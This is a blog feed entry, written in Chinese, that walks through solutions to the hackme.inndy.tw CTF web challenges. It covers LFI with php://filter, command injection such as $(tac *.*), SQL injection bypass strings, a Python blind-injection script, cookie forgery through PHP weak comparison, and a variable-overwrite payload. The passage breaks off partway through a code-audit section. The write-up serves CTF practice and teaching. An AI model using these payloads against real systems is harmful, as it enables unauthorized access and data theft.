    <link href="http://chaosec.top/2020/09/13/hackme-1/"/>
    <id>http://chaosec.top/2020/09/13/hackme-1/</id>
    <published>2020-09-13T13:44:24.000Z</published>
    <updated>2020-09-13T13:44:24.084Z</updated>
    
    <content type="html"><![CDATA[<p>历史文章补发</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">https://hackme.inndy.tw/</a></p><a id="more"></a><h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>查看源代码</p><p><img src="/2020/09/13/hackme-1/1.png" alt></p><p>尝试读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p></blockquote><p>读取config即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;lfi&#x2F;?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;pages&#x2F;config</span><br></pre></td></tr></table></figure><h1 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h1><p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 都可以实现执行命令的作用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></figure><p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></figure><h1 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h1><p>f12查看点击网络，查看一下消息头即可看到flag</p><h1 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h1><p>题目主要源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_</span><br></pre></td></tr></table></figure><p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;guest\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h1><p>上个题目的加强版，直接union注入即可，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;guest\&#39;  union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h1><p>题目过滤并不严格，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1#</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h1><p>上一题的加强版，需要进行盲注，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># database:login_as_admin1</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#"</span>, <span class="string">'password'</span>:<span class="string">"123"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">70</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">data[<span class="string">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class="line">content = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> content:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print(<span class="string">'**flag:**'</span>,flag)</span><br><span class="line">length += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a>login as admin 3</h1><p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    $r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p><p>那么我们构造一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line">    $user = [<span class="string">'admin'</span>, <span class="keyword">true</span>];</span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = <span class="number">0</span>;</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    <span class="keyword">return</span> $all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> set_user();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后刷新即可</p><h1 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a>login as admin 4</h1><p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">"name=admin"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure><h1 id="Login-as-Admin-6"><a href="#Login-as-Admin-6" class="headerlink" title="Login as Admin 6"></a>Login as Admin 6</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看代码可知存在变量覆盖漏洞，构造json数据即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">"users"</span>:&#123;<span class="string">"admin"</span>:<span class="string">"snow"</span>&#125;,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"snow"</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h1><p>md5弱比较</p><p><img src="/2020/09/13/hackme-1/2.png" alt="payload"></p><h1 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h1><p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p><h1 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h1><p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p><p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">        <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">        show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们跟进fun_admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($action2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"chpwd"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            changepwd($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"adduser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            adduser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edituser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            edituser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rmuser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            removeuser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            admin($admin, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的限制条件在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">$admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>我们跟进这个变量看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_user"</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_pass"</span>] = $data[<span class="number">1</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_dir"</span>] = $data[<span class="number">2</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_url"</span>] = $data[<span class="number">3</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"show_hidden"</span>] = $data[<span class="number">4</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"no_access"</span>] = $data[<span class="number">5</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再定位到find_user()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p><p>在fun_down.php文件中可以找到一个readfile()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $browser = id_browser();</span><br><span class="line">    header(<span class="string">'Content-Type: '</span> . (($browser == <span class="string">'IE'</span> || $browser == <span class="string">'OPERA'</span>) ? <span class="string">'application/octetstream'</span> : <span class="string">'application/octet-stream'</span>));</span><br><span class="line">    header(<span class="string">'Expires: '</span> . gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">    header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($abs_item));</span><br><span class="line">    <span class="keyword">if</span> ($browser == <span class="string">'IE'</span>) &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        